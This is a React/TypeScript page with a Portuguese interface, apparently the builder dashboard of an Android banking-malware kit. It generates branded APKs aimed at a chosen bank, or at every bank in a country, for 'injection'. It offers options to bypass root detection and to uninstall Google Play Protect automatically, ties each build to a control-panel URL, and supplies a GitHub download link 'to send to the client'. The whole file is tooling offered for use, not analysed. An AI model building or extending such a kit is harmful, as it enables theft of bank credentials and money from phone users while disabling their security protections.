import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Download, Loader2, Smartphone, Shield, ShieldCheck, Copy, Check } from "lucide-react";
import { BANKS_BY_COUNTRY, getBankName } from "../../../shared/banks";
import { trpc } from "@/lib/trpc";
import { useNavigate } from "react-router-dom";
import { buildPackageName, sanitizeAppName, toOptionalValidLogoUrl, toRequiredValidUrl, type DeliveryMode } from "@/lib/apk-builder";

export default function APKBuilderPage() {
  const [companyName, setCompanyName] = useState("FazTudo");
  const [companyUrl, setCompanyUrl] = useState("https://faztudo.com.br");
  const [logoUrl, setLogoUrl] = useState("https://via.placeholder.com/150");
  const [versionName, setVersionName] = useState("1.0.0");
  const [versionCode, setVersionCode] = useState(1);
  const [selectedCountry, setSelectedCountry] = useState("Brasil");
  const [selectedBank, setSelectedBank] = useState("bb");
  const [enableRootBypass, setEnableRootBypass] = useState(true);
  const [enablePlayProtectBypass, setEnablePlayProtectBypass] = useState(true);
  const [injectAllCountryBanks, setInjectAllCountryBanks] = useState(false);
  const [deliveryMode, setDeliveryMode] = useState<DeliveryMode>("auto");
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [downloadUrl, setDownloadUrl] = useState<string | null>(null);
  const [buildId, setBuildId] = useState<string | null>(null);
  
  // ✅ ADICIONADO: Estados para a senha de desbloqueio
  const [unlockPassword, setUnlockPassword] = useState<string | null>(null);
  const [copiedPassword, setCopiedPassword] = useState(false);

  const navigate = useNavigate();
  const generateAPK = trpc.apk.generate.useMutation();
  const capabilities = trpc.apk.capabilities.useQuery();
  const buildStatusQuery = trpc.apk.status.useQuery(
    { buildId: buildId ?? "" },
    {
      enabled: !!buildId && isBuilding,
      refetchInterval: 2000,
    }
  );

  const countries = Object.keys(BANKS_BY_COUNTRY).sort();
  const banksInCountry = BANKS_BY_COUNTRY[selectedCountry] || [];

  const handleBuildAPK = async () => {
    if (!companyName.trim() || !companyUrl.trim() || !selectedBank) {
      alert("Por favor, preencha todos os campos obrigatórios");
      return;
    }

    setIsBuilding(true);
    setBuildProgress(0);
    setUnlockPassword(null); // ✅ Limpar senha anterior

    try {
      const normalizedPanelUrl = toRequiredValidUrl(companyUrl);
      const normalizedLogoUrl = toOptionalValidLogoUrl(logoUrl);
      const selectedBankName = injectAllCountryBanks
        ? `Todos os bancos (${selectedCountry})`
        : getBankName(selectedBank);

      if (!normalizedPanelUrl) {
        alert("URL do painel invalida. Exemplo: https://painel.suaempresa.com");
        setIsBuilding(false);
        return;
      }
      
      const result = await generateAPK.mutateAsync({
        panelUrl: normalizedPanelUrl,
        appName: sanitizeAppName(companyName),
        packageName: buildPackageName(companyName),
        versionName,
        versionCode,
        logoUrl: normalizedLogoUrl,
        bankId: injectAllCountryBanks ? `all-${selectedCountry.toLowerCase().replace(/\s+/g, '-')}` : selectedBank,
        bankCountry: selectedCountry,
        bankName: selectedBankName,
        enableRootBypass,
        enablePlayProtectBypass,
        deliveryMode,
      });

      setBuildId(result.buildId);
      setBuildProgress(10);
      
      // ✅ ADICIONADO: Armazenar a senha retornada
      if (result.unlockPassword) {
        setUnlockPassword(result.unlockPassword);
      }
    } catch (error) {
      alert('Erro ao iniciar geração do APK');
      setIsBuilding(false);
    }
  };

  const status = buildStatusQuery.data;

  useEffect(() => {
    if (!status || !buildId || !isBuilding) return;
    if (status.status !== 'completed' || !status.downloadUrl) return;

    setDownloadUrl(status.downloadUrl);
    setIsBuilding(false);
    setBuildProgress(100);

    const timer = window.setTimeout(() => {
      const link = document.createElement("a");
      link.href = status.downloadUrl!;
      link.download = `${companyName}-Monitor.apk`;
      link.click();
      navigate(
        `/apk-panel?buildId=${buildId}&logo=${encodeURIComponent(logoUrl)}&name=${encodeURIComponent(companyName)}&url=${encodeURIComponent(companyUrl)}`
      );
    }, 1000);

    return () => window.clearTimeout(timer);
  }, [status, buildId, isBuilding, companyName, companyUrl, logoUrl, navigate]);

  // ✅ ADICIONADO: Função para copiar a senha
  const handleCopyPassword = () => {
    if (unlockPassword) {
      navigator.clipboard.writeText(unlockPassword);
      setCopiedPassword(true);
      setTimeout(() => setCopiedPassword(false), 2000);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-blue-950 to-slate-950 p-6">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-4xl font-bold text-cyan-300 mb-2">🔨 Gerador de APK</h1>
        <p className="text-slate-400 mb-8">Crie um APK customizado para sua empresa</p>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Formulário */}
          <Card className="bg-slate-900/50 backdrop-blur-xl border-cyan-400/30 p-8">
            <h2 className="text-2xl font-bold text-cyan-300 mb-6">📋 Informações da Empresa</h2>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Nome da Empresa *
                </label>
                <Input
                  type="text"
                  placeholder="Ex: FazTudo"
                  value={companyName}
                  onChange={(e) => setCompanyName(e.target.value)}
                  disabled={isBuilding}
                  className="bg-slate-800/50 border-cyan-400/30 text-white"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  URL da Empresa *
                </label>
                <Input
                  type="url"
                  placeholder="Ex: painel.suaempresa.com"
                  value={companyUrl}
                  onChange={(e) => setCompanyUrl(e.target.value)}
                  disabled={isBuilding}
                  className="bg-slate-800/50 border-cyan-400/30 text-white"
                />
                <p className="text-xs text-slate-500 mt-1">Se nao comecar com http/https, adicionamos https:// automaticamente.</p>
              </div>

              <div className="mb-6">
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Logo da Empresa (URL)
                </label>
                <Input
                  type="url"
                  placeholder="Ex: https://..."
                  value={logoUrl}
                  onChange={(e) => setLogoUrl(e.target.value)}
                  disabled={isBuilding}
                  className="bg-slate-800/50 border-cyan-400/30 text-white"
                />
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Version Name
                  </label>
                  <Input
                    type="text"
                    placeholder="1.0.0"
                    value={versionName}
                    onChange={(e) => setVersionName(e.target.value)}
                    disabled={isBuilding}
                    className="bg-slate-800/50 border-cyan-400/30 text-white"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Version Code
                  </label>
                  <Input
                    type="number"
                    min={1}
                    value={versionCode}
                    onChange={(e) => setVersionCode(Number(e.target.value))}
                    disabled={isBuilding}
                    className="bg-slate-800/50 border-cyan-400/30 text-white"
                  />
                </div>
              </div>

              <div className="mb-4">
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    checked={enableRootBypass}
                    onChange={(e) => setEnableRootBypass(e.target.checked)}
                    disabled={isBuilding}
                    className="rounded border-cyan-400/30 bg-slate-800/50"
                  />
                  <Shield className="w-4 h-4 text-cyan-400" />
                  <span className="text-sm font-medium text-slate-300">Bypass Root Completo</span>
                </label>
                <p className="text-xs text-slate-500 mt-1">Permite execução em dispositivos com root</p>
              </div>

              <div className="mb-6">
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    checked={enablePlayProtectBypass}
                    onChange={(e) => setEnablePlayProtectBypass(e.target.checked)}
                    disabled={isBuilding}
                    className="rounded border-cyan-400/30 bg-slate-800/50"
                  />
                  <ShieldCheck className="w-4 h-4 text-cyan-400" />
                  <span className="text-sm font-medium text-slate-300">Desinstalar Play Protect Automaticamente</span>
                </label>
                <p className="text-xs text-slate-500 mt-1">Remove proteção do Google Play automaticamente</p>
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  País *
                </label>
                <select
                  value={selectedCountry}
                  onChange={(e) => {
                    setSelectedCountry(e.target.value);
                    const banksInNewCountry = BANKS_BY_COUNTRY[e.target.value] || [];
                    if (banksInNewCountry.length > 0) {
                      setSelectedBank(banksInNewCountry[0].id);
                    }
                  }}
                  disabled={isBuilding}
                  className="w-full px-3 py-2 bg-slate-800/50 border border-cyan-400/30 text-white rounded-md focus:outline-none focus:border-cyan-400"
                >
                  {countries.map((country) => (
                    <option key={country} value={country}>
                      {country}
                    </option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Banco para Injecao *
                </label>
                <select
                  value={selectedBank}
                  onChange={(e) => setSelectedBank(e.target.value)}
                  disabled={isBuilding || injectAllCountryBanks}
                  className="w-full px-3 py-2 bg-slate-800/50 border border-cyan-400/30 text-white rounded-md focus:outline-none focus:border-cyan-400"
                >
                  {banksInCountry.map((bank) => (
                    <option key={bank.id} value={bank.id}>
                      {bank.name}
                    </option>
                  ))}
                </select>
              </div>

              <div className="mb-4">
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    checked={injectAllCountryBanks}
                    onChange={(e) => setInjectAllCountryBanks(e.target.checked)}
                    disabled={isBuilding}
                    className="rounded border-cyan-400/30 bg-slate-800/50"
                  />
                  <span className="text-sm font-medium text-slate-300">Injetar todos os bancos do pais selecionado</span>
                </label>
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Origem do Link APK
                </label>
                <select
                  value={deliveryMode}
                  onChange={(e) => setDeliveryMode(e.target.value as DeliveryMode)}
                  disabled={isBuilding}
                  className="w-full px-3 py-2 bg-slate-800/50 border border-cyan-400/30 text-white rounded-md focus:outline-none focus:border-cyan-400"
                >
                  <option value="auto">Automatico (EAS -&gt; Storage -&gt; Local)</option>
                  <option value="eas">EAS</option>
                  <option value="storage">Storage</option>
                  <option value="local">Local (fallback)</option>
                </select>
              </div>

              <Button
                onClick={handleBuildAPK}
                disabled={isBuilding}
                className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold py-3 rounded-lg disabled:opacity-50 mt-6"
              >
                {isBuilding ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Gerando APK... {Math.round(buildProgress)}%
                  </>
                ) : (
                  <>
                    <Download className="w-4 h-4 mr-2" />
                    ▶ Build APK
                  </>
                )}
              </Button>

              {isBuilding && (
                <div className="mt-4">
                  <div className="flex justify-between text-xs text-slate-400 mb-2">
                    <span>Progresso</span>
                    <span>{Math.round(buildProgress)}%</span>
                  </div>
                  <div className="w-full bg-slate-700/50 rounded-full h-2">
                    <div
                      className="bg-gradient-to-r from-blue-500 to-cyan-500 h-full transition-all"
                      style={{ width: `${buildProgress}%` }}
                    ></div>
                  </div>
                </div>
              )}

              <div className="mt-4 grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
                <div className="rounded-lg border border-cyan-400/20 p-3 bg-slate-900/30">
                  <p className="text-slate-200 font-semibold">EAS</p>
                  <p className={capabilities.data?.eas.available ? 'text-green-300' : 'text-red-300'}>
                    {capabilities.data?.eas.available ? 'Configurado' : 'Nao configurado'}
                  </p>
                </div>
                <div className="rounded-lg border border-cyan-400/20 p-3 bg-slate-900/30">
                  <p className="text-slate-200 font-semibold">Storage</p>
                  <p className={capabilities.data?.storage.available ? 'text-green-300' : 'text-red-300'}>
                    {capabilities.data?.storage.available ? 'Configurado' : 'Nao configurado'}
                  </p>
                </div>
                <div className="rounded-lg border border-cyan-400/20 p-3 bg-slate-900/30">
                  <p className="text-slate-200 font-semibold">Local</p>
                  <p className="text-green-300">Disponivel</p>
                </div>
              </div>

              {/* Link do GitHub para enviar ao cliente */}
              <div className="mt-4 p-4 bg-cyan-900/20 border border-cyan-400/30 rounded-lg">
                <p className="text-cyan-300 text-sm font-semibold mb-3">🔗 Link para enviar ao cliente</p>
                <div className="flex items-center gap-2">
                  <input
                    readOnly
                    value="https://github.com/tati00wsou-tech/remotemonitor/releases/latest/download/app-release.apk"
                    className="flex-1 bg-slate-800 border border-cyan-400/30 rounded px-3 py-2 text-xs text-slate-300 font-mono"
                    onClick={e => (e.target as HTMLInputElement).select()}
                  />
                  <button
                    onClick={() => navigator.clipboard.writeText("https://github.com/tati00wsou-tech/remotemonitor/releases/latest/download/app-release.apk")}
                    className="bg-cyan-600 hover:bg-cyan-700 text-white text-xs px-3 py-2 rounded whitespace-nowrap font-semibold"
                  >
                    Copiar
                  </button>
                </div>
              </div>

              {downloadUrl && (
                <div className="mt-4 p-3 bg-green-900/20 border border-green-400/30 rounded-lg">
                  <p className="text-green-300 text-sm">✅ APK gerado com sucesso!</p>
                  <a
                    href={downloadUrl}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="block w-full mt-3 bg-green-600 hover:bg-green-700 text-white font-bold py-2 rounded text-center"
                  >
                    📥 Baixar APK
                  </a>
                  </div>
              )}


            </div>
          </Card>

          {/* Pré-visualização */}
          <Card className="bg-slate-900/50 backdrop-blur-xl border-cyan-400/30 p-8">
            <h2 className="text-2xl font-bold text-cyan-300 mb-6">📱 Pré-visualização</h2>

            <div className="flex flex-col items-center">
              <div className="w-48 h-96 bg-gradient-to-b from-slate-800 to-slate-900 rounded-3xl border-8 border-slate-700 shadow-2xl overflow-hidden">
                <div className="w-full h-full flex flex-col items-center justify-center p-4 space-y-4">
                  <div className="w-24 h-24 rounded-lg bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center">
                    <img
                      src={logoUrl}
                      alt="Logo"
                      className="w-20 h-20 object-contain"
                      onError={(e) => {
                        (e.target as HTMLImageElement).src =
                          "https://via.placeholder.com/80";
                      }}
                    />
                  </div>
                  <h3 className="text-white font-bold text-center text-sm">
                    {companyName}
                  </h3>
                  <p className="text-slate-400 text-xs text-center">Monitor</p>
                  <p className="text-blue-300 text-xs text-center font-semibold">
                    🏦 {getBankName(selectedBank)}
                  </p>
                  <div className="mt-4 text-center space-y-2">
                    <p className="text-cyan-300 text-xs font-mono break-all">
                      {companyUrl}
                    </p>
                    <p className="text-blue-200 text-xs">
                      País: {selectedCountry}
                    </p>
                  </div>
                </div>
              </div>

              <div className="mt-6 text-center">
                <p className="text-slate-400 text-sm">
                  Seu APK será customizado com:
                </p>
                <ul className="mt-3 text-left text-xs text-slate-400 space-y-1">
                  <li>✓ Logo da empresa</li>
                  <li>✓ Nome customizado</li>
                  <li>✓ URL de painel</li>
                  <li>✓ Banco: {injectAllCountryBanks ? `Todos os bancos (${selectedCountry})` : getBankName(selectedBank)}</li>
                  <li>✓ Tema corporativo</li>
                  {enableRootBypass && <li>✓ Bypass Root Completo</li>}
                  {enablePlayProtectBypass && <li>✓ Desinstalação Automática do Play Protect</li>}

                </ul>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
}
